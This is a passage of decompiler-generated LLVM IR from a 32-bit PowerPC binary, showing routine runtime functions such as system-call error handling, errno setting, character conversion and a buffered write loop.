dec_label_pc_100092e0:                            ; preds = %dec_label_pc_100092b8
  %v0_100092e0 = call i32 @function_10004b48()
  %v0_100092e4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100092e4 = inttoptr i32 %v0_100092e0 to i32*
  store i32 %v0_100092e4, i32* %v2_100092e4, align 4
  br label %dec_label_pc_100092ec

dec_label_pc_100092ec:                            ; preds = %dec_label_pc_100092b8, %dec_label_pc_100092e0
  %v0_100092fc = phi i32 [ %v0_100092d0, %dec_label_pc_100092b8 ], [ -1, %dec_label_pc_100092e0 ]
  ret i32 %v0_100092fc

; uselistorder directives
  uselistorder label %dec_label_pc_100092ec, { 1, 0 }
}

define i32 @function_10009300(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009300:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009318 = call i32 @__asm_mfcr()
  %v1_1000931c = and i32 %v0_10009318, 268435456
  %v3_1000931c = icmp eq i32 %v1_1000931c, 0
  store i32 %v0_10009318, i32* %r31.global-to-local, align 4
  br i1 %v3_1000931c, label %dec_label_pc_10009334, label %dec_label_pc_10009328

dec_label_pc_10009328:                            ; preds = %dec_label_pc_10009300
  %v0_10009328 = call i32 @function_10004b48()
  %v0_1000932c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000932c = inttoptr i32 %v0_10009328 to i32*
  store i32 %v0_1000932c, i32* %v2_1000932c, align 4
  br label %dec_label_pc_10009334

dec_label_pc_10009334:                            ; preds = %dec_label_pc_10009300, %dec_label_pc_10009328
  %v0_10009344 = phi i32 [ %v0_10009318, %dec_label_pc_10009300 ], [ -1, %dec_label_pc_10009328 ]
  ret i32 %v0_10009344

; uselistorder directives
  uselistorder label %dec_label_pc_10009334, { 1, 0 }
}

define i32 @function_10009348(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009348:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_1000935c = and i32 %arg2, 64
  %v3_1000935c = icmp eq i32 %v1_1000935c, 0
  br i1 %v3_1000935c, label %dec_label_pc_10009388, label %dec_label_pc_1000936c

dec_label_pc_1000936c:                            ; preds = %dec_label_pc_10009348
  %v2_10009374 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10009374, i32* %stack_var_-32, align 4
  %v0_10009384 = load i32, i32* @r5, align 4
  br label %dec_label_pc_10009388

dec_label_pc_10009388:                            ; preds = %dec_label_pc_10009348, %dec_label_pc_1000936c
  %v0_10009388 = phi i32 [ 0, %dec_label_pc_10009348 ], [ %v0_10009384, %dec_label_pc_1000936c ]
  store i32 %v0_10009388, i32* @r5, align 4
  %v0_10009390 = call i32 @__asm_mfcr()
  %v1_10009394 = and i32 %v0_10009390, 268435456
  %v3_10009394 = icmp eq i32 %v1_10009394, 0
  store i32 %v0_10009390, i32* %r31.global-to-local, align 4
  br i1 %v3_10009394, label %dec_label_pc_100093ac, label %dec_label_pc_100093a0

dec_label_pc_100093a0:                            ; preds = %dec_label_pc_10009388
  %v0_100093a0 = call i32 @function_10004b48()
  %v0_100093a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100093a4 = inttoptr i32 %v0_100093a0 to i32*
  store i32 %v0_100093a4, i32* %v2_100093a4, align 4
  br label %dec_label_pc_100093ac

dec_label_pc_100093ac:                            ; preds = %dec_label_pc_10009388, %dec_label_pc_100093a0
  %v0_100093bc = phi i32 [ %v0_10009390, %dec_label_pc_10009388 ], [ -1, %dec_label_pc_100093a0 ]
  ret i32 %v0_100093bc

; uselistorder directives
  uselistorder label %dec_label_pc_100093ac, { 1, 0 }
  uselistorder label %dec_label_pc_10009388, { 1, 0 }
}

define i32 @function_100093c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100093c0:
  store i32 %arg1, i32* @r5, align 4
  %v2_100093cc = call i32 @function_10009348(i32 577, i32 577)
  ret i32 %v2_100093cc

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_10009348, { 2, 0, 1 }
  uselistorder i32 577, { 1, 2, 0, 3 }
}

define i32 @function_100093d0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100093d0:
  %r31.global-to-local = alloca i32, align 4
  %v0_100093e8 = call i32 @__asm_mfcr()
  %v1_100093ec = and i32 %v0_100093e8, 268435456
  %v3_100093ec = icmp eq i32 %v1_100093ec, 0
  store i32 %v0_100093e8, i32* %r31.global-to-local, align 4
  br i1 %v3_100093ec, label %dec_label_pc_10009404, label %dec_label_pc_100093f8

dec_label_pc_100093f8:                            ; preds = %dec_label_pc_100093d0
  %v0_100093f8 = call i32 @function_10004b48()
  %v0_100093fc = load i32, i32* %r31.global-to-local, align 4
  %v2_100093fc = inttoptr i32 %v0_100093f8 to i32*
  store i32 %v0_100093fc, i32* %v2_100093fc, align 4
  br label %dec_label_pc_10009404

dec_label_pc_10009404:                            ; preds = %dec_label_pc_100093d0, %dec_label_pc_100093f8
  %v0_10009414 = phi i32 [ %v0_100093e8, %dec_label_pc_100093d0 ], [ -1, %dec_label_pc_100093f8 ]
  ret i32 %v0_10009414

; uselistorder directives
  uselistorder label %dec_label_pc_10009404, { 1, 0 }
}

define i32 @function_10009418(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009418:
  store i32 %arg1, i32* @r30, align 4
  %v3_10009434 = load i32, i32* @global_var_100104dc.285, align 4
  %v3_10009438 = icmp eq i32 %v3_10009434, 0
  br i1 %v3_10009438, label %dec_label_pc_10009440, label %dec_label_pc_1000944c

dec_label_pc_10009440:                            ; preds = %dec_label_pc_10009418
  store i32 268473412, i32* @lr, align 4
  %v1_10009440 = call i32 @function_1000b530(i32 0)
  %v1_10009444 = icmp slt i32 %v1_10009440, 0
  br i1 %v1_10009444, label %dec_label_pc_1000946c, label %dec_label_pc_10009440.dec_label_pc_1000944c_crit_edge

dec_label_pc_10009440.dec_label_pc_1000944c_crit_edge: ; preds = %dec_label_pc_10009440
  %v0_1000944c.pre = load i32, i32* @r30, align 4
  %v3_10009450.pre = load i32, i32* @global_var_100104dc.285, align 4
  br label %dec_label_pc_1000944c

dec_label_pc_1000944c:                            ; preds = %dec_label_pc_10009440.dec_label_pc_1000944c_crit_edge, %dec_label_pc_10009418
  %v3_10009450 = phi i32 [ %v3_10009450.pre, %dec_label_pc_10009440.dec_label_pc_1000944c_crit_edge ], [ %v3_10009434, %dec_label_pc_10009418 ]
  %v1_10009458 = phi i32 [ %v0_1000944c.pre, %dec_label_pc_10009440.dec_label_pc_1000944c_crit_edge ], [ %arg1, %dec_label_pc_10009418 ]
  %v3_1000944c = icmp eq i32 %v1_10009458, 0
  store i32 %v3_10009450, i32* @r31, align 4
  br i1 %v3_1000944c, label %dec_label_pc_10009470, label %dec_label_pc_10009460

dec_label_pc_10009460:                            ; preds = %dec_label_pc_1000944c
  %v2_10009458 = add i32 %v1_10009458, %v3_10009450
  store i32 268473444, i32* @lr, align 4
  %v1_10009460 = call i32 @function_1000b530(i32 %v2_10009458)
  %tmp6 = icmp sgt i32 %v1_10009460, -1
  br i1 %tmp6, label %dec_label_pc_10009460.dec_label_pc_10009470_crit_edge, label %dec_label_pc_1000946c

dec_label_pc_10009460.dec_label_pc_10009470_crit_edge: ; preds = %dec_label_pc_10009460
  %v0_10009474.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009470

dec_label_pc_1000946c:                            ; preds = %dec_label_pc_10009460, %dec_label_pc_10009440
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_10009470

dec_label_pc_10009470:                            ; preds = %dec_label_pc_10009460.dec_label_pc_10009470_crit_edge, %dec_label_pc_1000944c, %dec_label_pc_1000946c
  %v0_10009474 = phi i32 [ %v0_10009474.pre, %dec_label_pc_10009460.dec_label_pc_10009470_crit_edge ], [ %v3_10009450, %dec_label_pc_1000944c ], [ -1, %dec_label_pc_1000946c ]
  ret i32 %v0_10009474

; uselistorder directives
  uselistorder i32 %v3_10009450, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_1000b530, { 1, 0 }
  uselistorder label %dec_label_pc_10009470, { 2, 0, 1 }
}

define i32 @function_10009488(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10009488:
  %r31.global-to-local = alloca i32, align 4
  %v3_10009488 = icmp eq i32 %arg2, 0
  br i1 %v3_10009488, label %dec_label_pc_100094c8, label %dec_label_pc_100094b0

dec_label_pc_100094b0:                            ; preds = %dec_label_pc_10009488
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_100094c8, label %dec_label_pc_100094b8

dec_label_pc_100094b8:                            ; preds = %dec_label_pc_100094b0
  %v0_100094b8 = call i32 @function_10004b48()
  %v2_100094c0 = inttoptr i32 %v0_100094b8 to i32*
  store i32 22, i32* %v2_100094c0, align 4
  %v0_100094ec.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100094e8

dec_label_pc_100094c8:                            ; preds = %dec_label_pc_100094b0, %dec_label_pc_10009488
  %v0_100094cc = call i32 @__asm_mfcr()
  %v1_100094d0 = and i32 %v0_100094cc, 268435456
  %v3_100094d0 = icmp eq i32 %v1_100094d0, 0
  store i32 %v0_100094cc, i32* %r31.global-to-local, align 4
  br i1 %v3_100094d0, label %dec_label_pc_100094e8, label %dec_label_pc_100094dc

dec_label_pc_100094dc:                            ; preds = %dec_label_pc_100094c8
  %v0_100094dc = call i32 @function_10004b48()
  %v0_100094e0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100094e0 = inttoptr i32 %v0_100094dc to i32*
  store i32 %v0_100094e0, i32* %v2_100094e0, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100094e8

dec_label_pc_100094e8:                            ; preds = %dec_label_pc_100094c8, %dec_label_pc_100094b8, %dec_label_pc_100094dc
  %v0_100094ec = phi i32 [ %v0_100094cc, %dec_label_pc_100094c8 ], [ %v0_100094ec.pre, %dec_label_pc_100094b8 ], [ -1, %dec_label_pc_100094dc ]
  ret i32 %v0_100094ec

; uselistorder directives
  uselistorder label %dec_label_pc_100094e8, { 2, 0, 1 }
}

define i32 @function_10009500(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009500:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009518 = call i32 @__asm_mfcr()
  %v1_1000951c = and i32 %v0_10009518, 268435456
  %v3_1000951c = icmp eq i32 %v1_1000951c, 0
  store i32 %v0_10009518, i32* %r31.global-to-local, align 4
  br i1 %v3_1000951c, label %dec_label_pc_10009534, label %dec_label_pc_10009528

dec_label_pc_10009528:                            ; preds = %dec_label_pc_10009500
  %v0_10009528 = call i32 @function_10004b48()
  %v0_1000952c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000952c = inttoptr i32 %v0_10009528 to i32*
  store i32 %v0_1000952c, i32* %v2_1000952c, align 4
  br label %dec_label_pc_10009534

dec_label_pc_10009534:                            ; preds = %dec_label_pc_10009500, %dec_label_pc_10009528
  %v0_10009544 = phi i32 [ %v0_10009518, %dec_label_pc_10009500 ], [ -1, %dec_label_pc_10009528 ]
  ret i32 %v0_10009544

; uselistorder directives
  uselistorder label %dec_label_pc_10009534, { 1, 0 }
}

define i32 @function_10009548() local_unnamed_addr {
dec_label_pc_10009548:
  ret i32 ptrtoint (i32* @global_var_100104c0.287 to i32)
}

define i32 @function_10009554(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10009554:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10009554 = icmp eq i32 %arg1, 0
  store i32 16, i32* @r6, align 4
  %v2_10009570 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10009570, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_10009554, label %dec_label_pc_1000957c, label %dec_label_pc_10009584

dec_label_pc_1000957c:                            ; preds = %dec_label_pc_10009554
  %v2_1000957c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000957c, i32* @r3, align 4
  br label %dec_label_pc_10009584

dec_label_pc_10009584:                            ; preds = %dec_label_pc_10009554, %dec_label_pc_1000957c
  %v0_10009588 = phi i32 [ %arg2, %dec_label_pc_10009554 ], [ 0, %dec_label_pc_1000957c ]
  %v2_10009584 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_10009588, i32* %stack_var_-40, align 4
  store i32 %v2_10009584, i32* %stack_var_-36, align 4
  store i32 268473748, i32* @lr, align 4
  %v0_10009590 = call i32 @function_100095c0()
  %v3_10009594 = icmp eq i32 %v0_10009590, 0
  br i1 %v3_10009594, label %dec_label_pc_1000959c, label %dec_label_pc_100095a0

dec_label_pc_1000959c:                            ; preds = %dec_label_pc_10009584
  br label %dec_label_pc_100095a0

dec_label_pc_100095a0:                            ; preds = %dec_label_pc_10009584, %dec_label_pc_1000959c
  %v0_100095ac = phi i32 [ %v0_10009590, %dec_label_pc_10009584 ], [ 1, %dec_label_pc_1000959c ]
  ret i32 %v0_100095ac

; uselistorder directives
  uselistorder label %dec_label_pc_100095a0, { 1, 0 }
  uselistorder label %dec_label_pc_10009584, { 1, 0 }
}

define i32 @function_100095b0() local_unnamed_addr {
dec_label_pc_100095b0:
  %v0_100095b4 = load i32, i32* @r5, align 4
  store i32 %v0_100095b4, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_100095bc = call i32 @function_100095c0()
  ret i32 %v0_100095bc

; uselistorder directives
  uselistorder i32 ()* @function_100095c0, { 1, 0 }
}

define i32 @function_100095c0() local_unnamed_addr {
dec_label_pc_100095c0:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100095c0 = load i32, i32* @r3, align 4
  %v3_100095c0 = icmp eq i32 %v0_100095c0, 0
  %v0_100095c4 = load i32, i32* @lr, align 4
  store i32 %v0_100095c4, i32* %r0.global-to-local, align 4
  br i1 %v3_100095c0, label %dec_label_pc_100095ec, label %dec_label_pc_100095d4

dec_label_pc_100095d4:                            ; preds = %dec_label_pc_100095c0
  %v1_100095d4 = load i32, i32* @r4, align 4
  %v4_100095d4 = icmp eq i32 %v0_100095c0, %v1_100095d4
  store i32 1, i32* %r10.global-to-local, align 4
  br i1 %v4_100095d4, label %dec_label_pc_100095e0, label %dec_label_pc_10009618

dec_label_pc_100095e0:                            ; preds = %dec_label_pc_100095d4
  %v2_100095e4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100095e4, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10009618

dec_label_pc_100095ec:                            ; preds = %dec_label_pc_100095c0
  %v2_100095e411 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100095e411, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_10009618

dec_label_pc_100095f8:                            ; preds = %dec_label_pc_10009658.dec_label_pc_10009638_crit_edge, %dec_label_pc_10009638.preheader
  %v0_100095f8 = call i32 @function_10004b48()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_10009604 = inttoptr i32 %v0_100095f8 to i32*
  store i32 84, i32* %v2_10009604, align 4
  %v0_1000967c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009678

dec_label_pc_1000960c:                            ; preds = %dec_label_pc_10009648
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_10009668.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10009664

dec_label_pc_10009618:                            ; preds = %dec_label_pc_100095e0, %dec_label_pc_100095d4, %dec_label_pc_100095ec
  %v2_100096487 = phi i32 [ %v2_100095e4, %dec_label_pc_100095e0 ], [ %v0_100095c0, %dec_label_pc_100095d4 ], [ %v2_100095e411, %dec_label_pc_100095ec ]
  %v0_10009618 = load i32, i32* @r5, align 4
  %v1_10009618 = load i32, i32* @r6, align 4
  %v3_10009618 = icmp ugt i32 %v0_10009618, %v1_10009618
  br i1 %v3_10009618, label %dec_label_pc_10009620, label %dec_label_pc_10009624

dec_label_pc_10009620:                            ; preds = %dec_label_pc_10009618
  store i32 %v1_10009618, i32* @r5, align 4
  br label %dec_label_pc_10009624

dec_label_pc_10009624:                            ; preds = %dec_label_pc_10009618, %dec_label_pc_10009620
  %v0_10009630 = phi i32 [ %v0_10009618, %dec_label_pc_10009618 ], [ %v1_10009618, %dec_label_pc_10009620 ]
  %v1_10009624 = add i32 %v0_10009630, 1
  store i32 %v1_10009624, i32* %r0.global-to-local, align 4
  %v0_10009628 = load i32, i32* @r4, align 4
  %v1_10009628 = inttoptr i32 %v0_10009628 to i32*
  %v2_10009628 = load i32, i32* %v1_10009628, align 4
  store i32 %v2_10009628, i32* %r11.global-to-local, align 4
  store i32 %v0_10009630, i32* %r9.global-to-local, align 4
  store i32 %v0_10009630, i32* %ctr.global-to-local, align 4
  %v2_100096603 = icmp eq i32 %v0_10009630, 0
  br i1 %v2_100096603, label %dec_label_pc_10009664, label %dec_label_pc_10009638.preheader

dec_label_pc_10009638.preheader:                  ; preds = %dec_label_pc_10009624
  %v1_1000963816 = inttoptr i32 %v2_10009628 to i32*
  %v2_1000963817 = load i32, i32* %v1_1000963816, align 4
  store i32 %v2_1000963817, i32* %r0.global-to-local, align 4
  %v1_1000963c18 = add i32 %v2_10009628, 4
  store i32 %v1_1000963c18, i32* %r11.global-to-local, align 4
  %v2_1000964020 = icmp ugt i32 %v2_1000963817, 127
  br i1 %v2_1000964020, label %dec_label_pc_100095f8, label %dec_label_pc_10009648.lr.ph

dec_label_pc_10009648.lr.ph:                      ; preds = %dec_label_pc_10009638.preheader
  %extract.t = trunc i32 %v2_1000963817 to i8
  br label %dec_label_pc_10009648

dec_label_pc_10009648:                            ; preds = %dec_label_pc_10009648.lr.ph, %dec_label_pc_10009658.dec_label_pc_10009638_crit_edge
  %v2_1000963823.off0 = phi i8 [ %extract.t, %dec_label_pc_10009648.lr.ph ], [ %extract.t24, %dec_label_pc_10009658.dec_label_pc_10009638_crit_edge ]
  %v2_1000964822 = phi i32 [ %v2_100096487, %dec_label_pc_10009648.lr.ph ], [ %v2_10009658, %dec_label_pc_10009658.dec_label_pc_10009638_crit_edge ]
  %v3_10009648 = inttoptr i32 %v2_1000964822 to i8*
  store i8 %v2_1000963823.off0, i8* %v3_10009648, align 1
  %v0_1000964c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000964c = urem i32 %v0_1000964c, 256
  store i32 %v1_1000964c, i32* %r0.global-to-local, align 4
  %v3_10009650 = icmp eq i32 %v1_1000964c, 0
  br i1 %v3_10009650, label %dec_label_pc_1000960c, label %dec_label_pc_10009658

dec_label_pc_10009658:                            ; preds = %dec_label_pc_10009648
  %v0_10009658 = load i32, i32* @r3, align 4
  %v1_10009658 = load i32, i32* %r10.global-to-local, align 4
  %v2_10009658 = add i32 %v1_10009658, %v0_10009658
  store i32 %v2_10009658, i32* @r3, align 4
  %v0_1000965c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000965c = add i32 %v0_1000965c, -1
  store i32 %v1_1000965c, i32* %r9.global-to-local, align 4
  %v0_10009660 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009660 = add i32 %v0_10009660, -1
  store i32 %v1_10009660, i32* %ctr.global-to-local, align 4
  %v2_10009660 = icmp eq i32 %v1_10009660, 0
  br i1 %v2_10009660, label %dec_label_pc_10009664, label %dec_label_pc_10009658.dec_label_pc_10009638_crit_edge

dec_label_pc_10009658.dec_label_pc_10009638_crit_edge: ; preds = %dec_label_pc_10009658
  %v0_10009638.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10009638 = inttoptr i32 %v0_10009638.pre to i32*
  %v2_10009638 = load i32, i32* %v1_10009638, align 4
  store i32 %v2_10009638, i32* %r0.global-to-local, align 4
  %v1_1000963c = add i32 %v0_10009638.pre, 4
  store i32 %v1_1000963c, i32* %r11.global-to-local, align 4
  %v2_10009640 = icmp ugt i32 %v2_10009638, 127
  %extract.t24 = trunc i32 %v2_10009638 to i8
  br i1 %v2_10009640, label %dec_label_pc_100095f8, label %dec_label_pc_10009648

dec_label_pc_10009664:                            ; preds = %dec_label_pc_10009658, %dec_label_pc_10009624, %dec_label_pc_1000960c
  %v0_10009668 = phi i32 [ %v0_10009668.pre, %dec_label_pc_1000960c ], [ %v2_100096487, %dec_label_pc_10009624 ], [ %v2_10009658, %dec_label_pc_10009658 ]
  %v2_10009664 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10009664, i32* %r0.global-to-local, align 4
  %v4_10009668 = icmp eq i32 %v0_10009668, %v2_10009664
  br i1 %v4_10009668, label %dec_label_pc_10009674, label %dec_label_pc_10009670

dec_label_pc_10009670:                            ; preds = %dec_label_pc_10009664
  %v0_10009670 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009670 = load i32, i32* @r4, align 4
  %v2_10009670 = inttoptr i32 %v1_10009670 to i32*
  store i32 %v0_10009670, i32* %v2_10009670, align 4
  br label %dec_label_pc_10009674

dec_label_pc_10009674:                            ; preds = %dec_label_pc_10009664, %dec_label_pc_10009670
  %v0_10009674 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009674 = load i32, i32* @r5, align 4
  %v2_10009674 = sub i32 %v1_10009674, %v0_10009674
  store i32 %v2_10009674, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009678

dec_label_pc_10009678:                            ; preds = %dec_label_pc_100095f8, %dec_label_pc_10009674
  %v0_1000967c = phi i32 [ %v0_1000967c.pre, %dec_label_pc_100095f8 ], [ %v2_10009674, %dec_label_pc_10009674 ]
  store i32 %v0_100095c4, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000967c

; uselistorder directives
  uselistorder i32 %v1_10009660, { 1, 0 }
  uselistorder i32 %v2_10009658, { 0, 2, 1 }
  uselistorder i32 %v1_1000964c, { 1, 0 }
  uselistorder i32 %v0_10009630, { 2, 3, 0, 1 }
  uselistorder i32 %v2_100096487, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 5, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 6, 3, 5, 0, 7, 4, 8 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0 }
  uselistorder i32 84, { 4, 5, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10009678, { 1, 0 }
  uselistorder label %dec_label_pc_10009674, { 1, 0 }
  uselistorder label %dec_label_pc_10009648, { 1, 0 }
  uselistorder label %dec_label_pc_10009624, { 1, 0 }
  uselistorder label %dec_label_pc_10009618, { 2, 0, 1 }
}

define i32 @function_1000968c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000968c:
  %v0_10009690 = load i32, i32* @lr, align 4
  store i32 268474032, i32* @lr, align 4
  %v2_100096ac = call i32 @function_1000902c(i32 3, i32 3)
  %v3_100096b0 = icmp eq i32 %v2_100096ac, -1
  store i32 %arg1, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  br i1 %v3_100096b0, label %dec_label_pc_100096d8, label %dec_label_pc_100096c4

dec_label_pc_100096c4:                            ; preds = %dec_label_pc_1000968c
  store i32 %v0_10009690, i32* @lr, align 4
  %v4_100096d4 = inttoptr i32 %arg2 to i8*
  %v5_100096d4 = call i32 @function_10005144(i32 %v2_100096ac, i8* %v4_100096d4)
  br label %dec_label_pc_100096d8

dec_label_pc_100096d8:                            ; preds = %dec_label_pc_1000968c, %dec_label_pc_100096c4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_1000902c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100096d8, { 1, 0 }
}

define i32 @function_100096f0(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100096f0:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_100096f0 = load i32, i32* @lr, align 4
  store i32 %v0_100096f0, i32* %r0.global-to-local, align 4
  %v0_100096fc = load i32, i32* @r5, align 4
  store i32 %v0_100096fc, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_100096fc, i32* @r31, align 4
  %v3_100097103 = icmp eq i32 %v0_100096fc, 0
  store i32 %v0_100096fc, i32* @r27, align 4
  br i1 %v3_100097103, label %dec_label_pc_100097b8, label %dec_label_pc_10009720

dec_label_pc_10009720:                            ; preds = %dec_label_pc_100096f0, %dec_label_pc_10009740
  %v0_10009730 = phi i32 [ %v2_10009740, %dec_label_pc_10009740 ], [ %arg2, %dec_label_pc_100096f0 ]
  %v1_10009720.in = phi i32 [ %v2_10009744, %dec_label_pc_10009740 ], [ %v0_100096fc, %dec_label_pc_100096f0 ]
  %v1_10009720 = icmp sgt i32 %v1_10009720.in, 0
  br i1 %v1_10009720, label %dec_label_pc_1000972c, label %dec_label_pc_10009724

dec_label_pc_10009724:                            ; preds = %dec_label_pc_10009720
  br label %dec_label_pc_1000972c

dec_label_pc_1000972c:                            ; preds = %dec_label_pc_10009720, %dec_label_pc_10009724
  %v0_1000972c = load i32, i32* @r30, align 4
  %v1_1000972c = add i32 %v0_1000972c, 4
  %v2_1000972c = inttoptr i32 %v1_1000972c to i32*
  %v3_1000972c = load i32, i32* %v2_1000972c, align 4
  store i32 268474168, i32* @lr, align 4
  %v3_10009734 = call i32 @function_10004ae0(i32 %v3_1000972c, i32 %v0_10009730)
  %v1_10009738 = icmp slt i32 %v3_10009734, 0
  br i1 %v1_10009738, label %dec_label_pc_1000974c, label %dec_label_pc_10009740

dec_label_pc_10009740:                            ; preds = %dec_label_pc_1000972c
  %v0_10009740 = load i32, i32* @r29, align 4
  %v2_10009740 = add i32 %v0_10009740, %v3_10009734
  store i32 %v2_10009740, i32* @r29, align 4
  %v1_10009744 = load i32, i32* @r31, align 4
  %v2_10009744 = sub i32 %v1_10009744, %v3_10009734
  store i32 %v2_10009744, i32* @r31, align 4
  %v3_10009710 = icmp eq i32 %v2_10009744, 0
  store i32 %v2_10009744, i32* @r27, align 4
  br i1 %v3_10009710, label %dec_label_pc_10009710.dec_label_pc_100097b8.loopexit_crit_edge, label %dec_label_pc_10009720

dec_label_pc_1000974c:                            ; preds = %dec_label_pc_1000972c
  %v0_1000974c = load i32, i32* @r30, align 4
  %v1_1000974c = add i32 %v0_1000974c, 8
  %v2_1000974c = inttoptr i32 %v1_1000974c to i32*
  %v3_1000974c = load i32, i32* %v2_1000974c, align 4
  store i32 %v3_1000974c, i32* %r11.global-to-local, align 4
  %v1_10009750 = add i32 %v0_1000974c, 12
  %v2_10009750 = inttoptr i32 %v1_10009750 to i32*
  %v3_10009750 = load i32, i32* %v2_10009750, align 4
  store i32 %v3_10009750, i32* %r0.global-to-local, align 4
  %v1_10009754 = inttoptr i32 %v0_1000974c to i16*
  %v2_10009754 = load i16, i16* %v1_10009754, align 2
  %v2_10009758 = sub i32 %v3_10009750, %v3_1000974c
  store i32 %v2_10009758, i32* %r0.global-to-local, align 4
  %v5_10009758 = icmp eq i32 %v2_10009758, 0
  %v1_1000975c = or i16 %v2_10009754, 8
  store i16 %v1_1000975c, i16* %v1_10009754, align 2
  br i1 %v5_10009758, label %dec_label_pc_1000974c.dec_label_pc_100097b4_crit_edge, label %dec_label_pc_10009768

dec_label_pc_1000974c.dec_label_pc_100097b4_crit_edge: ; preds = %dec_label_pc_1000974c
  %v0_100097b4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100097b4

dec_label_pc_10009768:                            ; preds = %dec_label_pc_1000974c
  %v0_10009768 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009768 = load i32, i32* @r31, align 4
  %v3_10009768 = icmp ugt i32 %v0_10009768, %v1_10009768
  br i1 %v3_10009768, label %dec_label_pc_10009768.dec_label_pc_10009774_crit_edge, label %dec_label_pc_10009770

dec_label_pc_10009768.dec_label_pc_10009774_crit_edge: ; preds = %dec_label_pc_10009768
  %v0_10009774.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10009774

dec_label_pc_10009770:                            ; preds = %dec_label_pc_10009768
  store i32 %v0_10009768, i32* @r27, align 4
  br label %dec_label_pc_10009774

dec_label_pc_10009774:                            ; preds = %dec_label_pc_10009768.dec_label_pc_10009774_crit_edge, %dec_label_pc_10009770
  %v0_10009774 = phi i32 [ %v0_10009774.pre, %dec_label_pc_10009768.dec_label_pc_10009774_crit_edge ], [ %v0_10009768, %dec_label_pc_10009770 ]
  store i32 %v0_10009774, i32* %ctr.global-to-local, align 4
  %v2_10009780.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009778

dec_label_pc_10009778:                            ; preds = %dec_label_pc_1000979c, %dec_label_pc_10009774
  %v2_10009780 = phi i32 [ %v1_1000979c, %dec_label_pc_1000979c ], [ %v2_10009780.pre, %dec_label_pc_10009774 ]
  %v0_10009778 = load i32, i32* @r29, align 4
  %v1_10009778 = inttoptr i32 %v0_10009778 to i8*
  %v2_10009778 = load i8, i8* %v1_10009778, align 1
